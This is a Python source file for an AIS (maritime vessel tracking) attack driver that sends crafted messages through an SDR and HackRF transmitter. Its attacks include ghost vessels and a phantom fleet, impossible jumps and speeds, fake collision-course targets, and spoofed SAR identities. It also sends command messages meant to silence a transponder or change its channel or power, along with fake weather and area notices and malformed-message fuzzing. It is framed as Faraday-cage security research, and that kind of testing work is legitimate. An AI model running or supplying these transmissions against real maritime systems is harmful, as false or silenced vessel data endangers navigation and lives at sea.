#!/usr/bin/env python3
r"""
rf_attack.py -- scriptable AIS attack driver (no web UI).

Sends AIS message bit strings to a running ais-simulator.py flowgraph over its
websocket (default ws://127.0.0.1:52002/ws). The flowgraph's proven C++ block adds
the preamble/flags/CRC/NRZI framing and GMSK-modulates to the HackRF, so this driver
only has to produce the correct message PAYLOAD bits -- which ais_encode.py already
does (verified against pyais).

** SAFETY **
This causes RF transmission. ais-simulator.py transmits whatever it receives, so this
tool keeps the cage-sealed gate: it will not send anything until you confirm the cage
is sealed (or pass --i-confirm-cage-sealed for scripted runs). Every message sent is
logged with a timestamp so the witness receiver's recording can be matched to it.

Design: attacks are named functions returning a list of (payload_bits, meta) to send.
Run one attack by name, or list them. This mirrors the serial-side "named case" pattern.

Prereq on the attacker Pi (cage sealed):
    python3 -u ais-simulator.py -c 1 --lna 20        # channel B, moderate gain
Then:
    python3 rf_attack.py --list
    python3 rf_attack.py ghost_ship
    python3 rf_attack.py impossible_jump --repeat 20

Requires: pip install websocket-client
"""
import argparse, json, os, sys, time

try:
    import websocket  # websocket-client
except Exception:
    websocket = None

# reuse the validated payload builders
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import ais_encode as enc


# ----------------------------------------------------------------------------
# Attack scenarios. Each returns (list_of_payload_bitstrings, description).
# Positions: spoof target and a baseline; adjust to your cage test coordinates.
# ----------------------------------------------------------------------------
SPOOF_LAT, SPOOF_LON = 42.35, -70.90       # your validated loopback coords
JUMP_LAT, JUMP_LON = 45.50, -75.50

def _t1(mmsi, lat, lon, sog=0.0, cog=0.0, nav=0):
    """Type 1 position report payload bits (168)."""
    return enc.encode_type1(mmsi, lat, lon, sog=sog, cog=cog, nav_status=nav)


def ghost_ship():
    """A single non-existent vessel at a fixed position (the basic phantom target)."""
    mmsi = 366000001
    return [(_t1(mmsi, SPOOF_LAT, SPOOF_LON, sog=0.0), f"ghost MMSI {mmsi} @ {SPOOF_LAT},{SPOOF_LON}")], \
           "Ghost ship: one fake vessel broadcasting a fixed position."


def impossible_jump():
    """Same MMSI reporting two far-apart positions in quick succession (teleport)."""
    mmsi = 366000002
    return [
        (_t1(mmsi, SPOOF_LAT, SPOOF_LON, sog=0.0), f"jump A @ {SPOOF_LAT},{SPOOF_LON}"),
        (_t1(mmsi, JUMP_LAT, JUMP_LON, sog=0.0), f"jump B @ {JUMP_LAT},{JUMP_LON}"),
    ], "Impossible jump: one MMSI teleporting between two distant positions."


def impossible_speed():
    """A vessel reporting an implausible speed (e.g. 102 kn) at a real position."""
    mmsi = 366000003
    return [(_t1(mmsi, SPOOF_LAT, SPOOF_LON, sog=102.0, cog=90.0),
             f"MMSI {mmsi} @ {SPOOF_LAT},{SPOOF_LON} SOG 102kn")], \
           "Impossible speed: 102 knots (physically impossible for a vessel)."


def fake_identity_sar():
    """A Type 1 from an MMSI in the SAR aircraft range (111xxxxxx) -- wrong identity class."""
    mmsi = 111000001   # 111 = SAR aircraft prefix
    return [(_t1(mmsi, SPOOF_LAT, SPOOF_LON), f"SAR-prefix MMSI {mmsi} sending vessel report")], \
           "Fake identity class: SAR-aircraft MMSI (111...) sending a Class-A position."


def rapid_ghost_fleet(n=10):
    """Many distinct fake vessels injected quickly (fleet of phantoms)."""
    msgs = []
    for i in range(n):
        mmsi = 366100000 + i
        lat = SPOOF_LAT + (i % 5) * 0.01
        lon = SPOOF_LON + (i // 5) * 0.01
        msgs.append((_t1(mmsi, lat, lon, sog=5.0, cog=(i*36) % 360),
                     f"fleet ghost {i} MMSI {mmsi}"))
    return msgs, f"Rapid ghost fleet: {n} distinct fake vessels."


def collision_course():
    """Two vessels on converging tracks (for the multi-vessel collision test)."""
    return [
        (_t1(366000010, SPOOF_LAT, SPOOF_LON, sog=15.0, cog=90.0), "vessel1 heading E"),
        (_t1(366000011, SPOOF_LAT, SPOOF_LON + 0.1, sog=15.0, cog=270.0), "vessel2 heading W"),
    ], "Collision course: two vessels converging head-on."


# --- command / control-message attacks (target a transponder's protocol behavior) ---
DEST_MMSI = 247320152   # placeholder target; set to a transponder's MMSI in the cage
BASE_STATION_MMSI = 2000000   # 00xxxxxxx = base station identity (source-validation tests)

def interrogation():
    """M15: ask the target to reply (with its Type 3/5). Tests if it answers an SDR."""
    return [(enc.encode_type15(366000001, DEST_MMSI, msg1_1=5),
             f"M15 interrogate {DEST_MMSI} for msg5")], \
           "Interrogation (M15): request a reply from the target transponder."

def rate_assignment():
    """M16: assign a reporting rate/slot -> near-silence. Tests if the unit obeys."""
    return [(enc.encode_type16(366000001, DEST_MMSI, offset_a=0, increment_a=0),
             f"M16 assign {DEST_MMSI} rate 0")], \
           "Rate assignment (M16): command near-silence on the target."

def channel_mgmt():
    """M22: force a channel/power change. Tests if the unit switches."""
    return [(enc.encode_type22(366000001, addressed=1, dest1=DEST_MMSI, power=1),
             f"M22 channel/power change addressed to {DEST_MMSI}")], \
           "Channel management (M22): command a channel/power change on the target."

def slot_reservation():
    """M20: reserve many FATDMA slots (slot hogging via SDR)."""
    return [(enc.encode_type20(366000001, offset1=0, slots1=5, timeout1=7),
             "M20 reserve 5 slots")], \
           "Slot reservation (M20): reserve slots to crowd out other stations."

def base_vs_regular():
    """Source validation: same interrogation from a base-station MMSI vs a regular one.
    Send both; compare whether the target treats them differently."""
    return [
        (enc.encode_type15(BASE_STATION_MMSI, DEST_MMSI, msg1_1=5),
         f"M15 from BASE {BASE_STATION_MMSI}"),
        (enc.encode_type15(366000001, DEST_MMSI, msg1_1=5),
         f"M15 from REGULAR 366000001"),
    ], "Source validation: interrogation from base-station vs regular MMSI."

def fake_area_notice():
    """M8 broadcast binary, area-notice application (DAC=1, FID=22)."""
    return [(enc.encode_type8(366000001, dac=1, fid=22, app_data_bits="0"*80),
             "M8 area notice (dac1 fid22)")], \
           "Fake area notice (M8): broadcast a binary area-notice message."

def fake_met_hydro():
    """M8 broadcast binary, meteorological/hydrological application (DAC=1, FID=11)."""
    return [(enc.encode_type8(366000001, dac=1, fid=11, app_data_bits="0"*80),
             "M8 met/hydro (dac1 fid11)")], \
           "Fake met/hydro (M8): broadcast fake weather data."

def auto_ack():
    """M6 addressed binary to the target: does it auto-acknowledge?"""
    return [(enc.encode_type6(366000001, DEST_MMSI, dac=1, fid=0, app_data_bits="0"*40),
             f"M6 addressed to {DEST_MMSI}")], \
           "Auto-ack (M6): addressed binary message; watch for an acknowledgement."

# --- protocol-fuzzing / malformed attacks (probe parser robustness) ---
def reserved_values():
    """M1 with reserved/illegal field values: nav=13, SOG=1023, COG=4000, heading=511."""
    return [(enc.encode_type1_raw(366000001, SPOOF_LAT, SPOOF_LON,
                                  sog_u=1023, nav_status=13, cog_u=4000, heading=511),
             "M1 reserved values nav13/sog1023/cog4000/hdg511")], \
           "Reserved values: illegal nav status, SOG, COG, heading sentinels."

def sentinels_misused():
    """M1 with out-of-range position sentinels: lat=91, lon=181 (invalid coordinates)."""
    return [(enc.encode_type1_raw(366000001, 91.0, 181.0),
             "M1 lat=91 lon=181 (out of range)")], \
           "Sentinels misused: out-of-range latitude/longitude."

def spare_bits_nonzero():
    """M1 with spare bits set to 1 (spec says they must be 0)."""
    return [(enc.encode_type1_raw(366000001, SPOOF_LAT, SPOOF_LON, spare=7),
             "M1 spare bits = 1")], \
           "Spare bits nonzero: bits the spec requires to be zero are set."

def undefined_msg_type():
    """A message with an undefined/reserved type (28)."""
    return [(enc.encode_undefined_type(28, 366000001),
             "undefined message type 28")], \
           "Undefined message ID: message type 28 (not defined in the spec)."

def truncated_msg():
    """A Type 1 truncated to 80 bits (incomplete message)."""
    full = enc.encode_type1(366000001, SPOOF_LAT, SPOOF_LON)
    return [(enc.make_truncated(full, 80), "M1 truncated to 80 bits")], \
           "Truncated message: an incomplete Type 1 (may be rejected by the framer)."

def oversized_msg():
    """A Type 1 padded 40 bits beyond spec length."""
    full = enc.encode_type1(366000001, SPOOF_LAT, SPOOF_LON)
    return [(enc.make_oversized(full, 40), "M1 oversized +40 bits")], \
           "Oversized message: a Type 1 longer than the spec (may overflow the slot)."


ATTACKS = {
    "ghost_ship": ghost_ship,
    "impossible_jump": impossible_jump,
    "impossible_speed": impossible_speed,
    "fake_identity_sar": fake_identity_sar,
    "rapid_ghost_fleet": rapid_ghost_fleet,
    "collision_course": collision_course,
    # command / control
    "interrogation": interrogation,
    "rate_assignment": rate_assignment,
    "channel_mgmt": channel_mgmt,
    "slot_reservation": slot_reservation,
    "base_vs_regular": base_vs_regular,
    "fake_area_notice": fake_area_notice,
    "fake_met_hydro": fake_met_hydro,
    "auto_ack": auto_ack,
    # protocol fuzzing / malformed
    "reserved_values": reserved_values,
    "sentinels_misused": sentinels_misused,
    "spare_bits_nonzero": spare_bits_nonzero,
    "undefined_msg_type": undefined_msg_type,
    "truncated_msg": truncated_msg,
    "oversized_msg": oversized_msg,
}


# ----------------------------------------------------------------------------
# websocket send + cage gate + logging
# ----------------------------------------------------------------------------
def cage_gate(skip):
    if skip:
        return True
    print("=" * 66)
    print(" TRANSMIT SAFETY CHECK -- this sends AIS over the air via the HackRF.")
    print(" Only proceed with the Faraday cage sealed.")
    print("=" * 66)
    ans = input(" Type EXACTLY 'cage is sealed' to transmit: ")
    if ans.strip() != "cage is sealed":
        print(" Aborted. Nothing transmitted.")
        return False
    return True


def send_payloads(url, payloads, gap, repeat, logf):
    """Connect to the ais-simulator websocket and send each payload bit string."""
    ws = websocket.create_connection(url, timeout=10)
    print(f"connected to {url}")
    logf.write(json.dumps({"event": "ws_connect", "url": url, "t": time.time()}) + "\n")
    try:
        for r in range(repeat):
            for (bits, meta) in payloads:
                # sanity: only 0/1 characters, reasonable length
                if any(c not in "01" for c in bits):
                    raise ValueError(f"payload has non-binary chars: {meta}")
                ws.send(bits)
                rec = {"event": "sent", "t": time.time(),
                       "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                       "bits_len": len(bits), "meta": meta, "rep": r}
                logf.write(json.dumps(rec) + "\n"); logf.flush()
                print(f"  sent [{r}] {meta} ({len(bits)} bits)")
                time.sleep(gap)
    finally:
        ws.close()
        logf.write(json.dumps({"event": "ws_close", "t": time.time()}) + "\n")


def main():
    ap = argparse.ArgumentParser(description="Scriptable AIS attack driver (no web UI).")
    ap.add_argument("attack", nargs="?", help="attack name (see --list)")
    ap.add_argument("--list", action="store_true", help="list available attacks")
    ap.add_argument("--url", default="ws://127.0.0.1:52002/ws",
                    help="ais-simulator websocket (default local). For a remote Pi use "
                         "ws://192.168.50.11:52002/ws")
    ap.add_argument("--gap", type=float, default=1.0,
                    help="seconds between messages (AIS Class A reports ~every 2-10s)")
    ap.add_argument("--repeat", type=int, default=1,
                    help="repeat the whole scenario N times (ghosts must repeat to persist)")
    ap.add_argument("--n", type=int, default=10, help="fleet size for rapid_ghost_fleet")
    ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
    ap.add_argument("--i-confirm-cage-sealed", action="store_true")
    args = ap.parse_args()

    if args.list or not args.attack:
        print("available attacks:")
        for name, fn in ATTACKS.items():
            _, desc = (fn(args.n) if name == "rapid_ghost_fleet" else fn())
            print(f"  {name:20s} {desc}")
        print("\nrun: python3 rf_attack.py <name> [--repeat N] [--gap S] [--url ws://...]")
        return

    if args.attack not in ATTACKS:
        print(f"unknown attack '{args.attack}'. use --list."); sys.exit(2)
    if websocket is None:
        print("!! needs websocket-client: pip install websocket-client --break-system-packages")
        sys.exit(1)

    fn = ATTACKS[args.attack]
    payloads, desc = (fn(args.n) if args.attack == "rapid_ghost_fleet" else fn())
    print(f"attack: {args.attack}")
    print(f"  {desc}")
    print(f"  {len(payloads)} distinct message(s), repeat {args.repeat}x, gap {args.gap}s")
    print(f"  target websocket: {args.url}")
    print()
    print("  NOTE: ais-simulator.py must already be running (cage sealed) and will")
    print("        transmit each message on the AIS channel you launched it with.")
    print()

    if not cage_gate(args.i_confirm_cage_sealed):
        sys.exit(0)

    os.makedirs(args.logdir, exist_ok=True)
    stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    logpath = os.path.join(args.logdir, f"attack_{args.attack}_{stamp}.jsonl")
    with open(logpath, "a", buffering=1) as logf:
        logf.write(json.dumps({"event": "attack_start", "attack": args.attack,
                               "desc": desc, "t": time.time()}) + "\n")
        try:
            send_payloads(args.url, payloads, args.gap, args.repeat, logf)
        except KeyboardInterrupt:
            print("\ninterrupted.")
        except Exception as e:
            print(f"!! send failed: {e}")
            print("   is ais-simulator.py running and reachable at that URL?")
    print(f"\ndone. attack log: {logpath}")
    print("Match its timestamps against the listener's NMEA recording.")


if __name__ == "__main__":
    main()
